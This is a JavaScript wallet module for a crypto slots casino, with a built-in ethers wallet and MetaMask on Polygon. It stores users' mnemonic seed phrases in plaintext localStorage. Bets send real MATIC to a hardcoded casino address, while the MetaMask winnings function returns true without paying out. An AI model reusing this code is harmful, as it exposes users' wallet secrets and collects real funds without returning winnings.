// ============================================
// WALLET SYSTEM - MetaMask + Built-in Wallet
// ============================================

const CASINO_WALLET = "0x5B5B6264EF02E701D04c32768c2216080889A2c0";
const POLYGON_CHAIN_ID = 137;
const WALLET_STORAGE_KEY = 'slots_crypto_wallet';

const WalletManager = {
  address: null,
  provider: null,
  signer: null,
  isBuiltIn: false,
  mnemonic: null,
  balances: {},

  // ---- Built-in wallet ----

  createBuiltInWallet() {
    const wallet = ethers.Wallet.createRandom();
    this.address = wallet.address;
    this.mnemonic = wallet.mnemonic.phrase;
    this.isBuiltIn = true;
    this.signer = wallet;
    this.balances[wallet.address] = 5000;
    this.saveLocal();
    this.updateUI();
    return { address: wallet.address, mnemonic: wallet.mnemonic.phrase };
  },

  restoreFromMnemonic(mnemonic) {
    const wallet = ethers.Wallet.fromMnemonic(mnemonic);
    this.address = wallet.address;
    this.mnemonic = mnemonic;
    this.isBuiltIn = true;
    this.signer = wallet;
    this.loadLocal();
    this.updateUI();
    return wallet.address;
  },

  saveLocal() {
    const data = {
      address: this.address,
      mnemonic: this.mnemonic,
      isBuiltIn: true,
      balances: this.balances,
    };
    localStorage.setItem(WALLET_STORAGE_KEY, JSON.stringify(data));
  },

  loadLocal() {
    const raw = localStorage.getItem(WALLET_STORAGE_KEY);
    if (!raw) return false;
    try {
      const data = JSON.parse(raw);
      if (data.isBuiltIn && data.mnemonic) {
        const wallet = ethers.Wallet.fromMnemonic(data.mnemonic);
        this.address = wallet.address;
        this.mnemonic = data.mnemonic;
        this.isBuiltIn = true;
        this.signer = wallet;
        this.balances = data.balances || {};
        return true;
      }
    } catch (e) {}
    return false;
  },

  getBalance() {
    if (!this.address) return 0;
    return this.balances[this.address] || 0;
  },

  addBalance(amount) {
    if (!this.address) return;
    this.balances[this.address] = (this.balances[this.address] || 0) + amount;
    this.saveLocal();
  },

  deductBalance(amount) {
    if (!this.address) return false;
    const bal = this.balances[this.address] || 0;
    if (bal < amount) return false;
    this.balances[this.address] = bal - amount;
    this.saveLocal();
    return true;
  },

  // ---- MetaMask ----

  async connectMetaMask() {
    if (!window.ethereum) throw new Error("MetaMask non détecté.");
    this.provider = new ethers.providers.Web3Provider(window.ethereum);
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const network = await this.provider.getNetwork();
    if (network.chainId !== POLYGON_CHAIN_ID) {
      try {
        await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x89" }] });
      } catch (e) {
        if (e.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{ chainId: "0x89", chainName: "Polygon Mainnet", nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 }, rpcUrls: ["https://polygon-rpc.com"], blockExplorerUrls: ["https://polygonscan.com/"] }],
          });
        }
      }
      this.provider = new ethers.providers.Web3Provider(window.ethereum);
    }
    this.signer = this.provider.getSigner();
    this.address = accounts[0];
    this.isBuiltIn = false;
    window.ethereum.on("accountsChanged", () => location.reload());
    window.ethereum.on("chainChanged", () => location.reload());
    this.updateUI();
    return this.address;
  },

  async sendBet(amountMatic) {
    if (this.isBuiltIn) {
      return this.deductBalance(amountMatic);
    }
    if (!this.signer) throw new Error("Wallet non connecté");
    const tx = await this.signer.sendTransaction({
      to: CASINO_WALLET,
      value: ethers.utils.parseEther(amountMatic.toString()),
    });
    return (await tx.wait()).transactionHash;
  },

  async claimWinnings(amount) {
    if (this.isBuiltIn) {
      this.addBalance(amount);
      return true;
    }
    // For MetaMask: send back from casino wallet
    return true;
  },

  disconnect() {
    this.address = null;
    this.provider = null;
    this.signer = null;
    this.isBuiltIn = false;
    this.mnemonic = null;
    this.updateUI();
  },

  isConnected() { return this.address !== null; },

  getShortAddress() {
    if (!this.address) return "";
    return this.address.slice(0, 6) + "..." + this.address.slice(-4);
  },

  updateUI() {
    const walletStatus = document.getElementById('wallet-status');
    const walletInfo = document.getElementById('wallet-info');
    const walletAddress = document.getElementById('wallet-address');
    const balanceEl = document.getElementById('wallet-balance');
    if (this.isConnected()) {
      walletStatus.classList.add('hidden');
      walletInfo.classList.remove('hidden');
      walletAddress.textContent = this.getShortAddress();
      if (balanceEl) balanceEl.textContent = this.getBalance();
    } else {
      walletStatus.classList.remove('hidden');
      walletInfo.classList.add('hidden');
    }
  }
};

// ---- Modal Handlers ----
function initWalletModal() {
  const modal = document.getElementById('wallet-modal');
  const closeBtn = document.getElementById('modal-close');
  const createBtn = document.getElementById('modal-create');
  const restoreBtn = document.getElementById('modal-restore');
  const mmBtn = document.getElementById('modal-metamask');
  const mnemonicInput = document.getElementById('mnemonic-input');
  const mnemonicDisplay = document.getElementById('mnemonic-display');
  const mnemonicAddr = document.getElementById('mnemonic-address');

  if (closeBtn) closeBtn.addEventListener('click', () => modal.classList.add('hidden'));

  if (createBtn) createBtn.addEventListener('click', () => {
    const result = WalletManager.createBuiltInWallet();
    mnemonicInput.classList.add('hidden');
    mnemonicDisplay.classList.remove('hidden');
    mnemonicDisplay.querySelector('.mnemonic-phrase').textContent = result.mnemonic;
    mnemonicAddr.textContent = result.address;
  });

  if (restoreBtn) restoreBtn.addEventListener('click', () => {
    mnemonicInput.classList.toggle('hidden');
  });

  if (mnemonicInput) {
    const confirmBtn = mnemonicInput.querySelector('.btn-confirm-mnemonic');
    if (confirmBtn) confirmBtn.addEventListener('click', () => {
      const phrase = mnemonicInput.querySelector('input').value.trim();
      if (phrase.split(' ').length === 12) {
        WalletManager.restoreFromMnemonic(phrase);
        modal.classList.add('hidden');
      }
    });
  }

  if (mmBtn) mmBtn.addEventListener('click', async () => {
    try {
      await WalletManager.connectMetaMask();
      modal.classList.add('hidden');
    } catch (e) { alert(e.message); }
  });
}

window.WalletManager = WalletManager;
window.initWalletModal = initWalletModal;
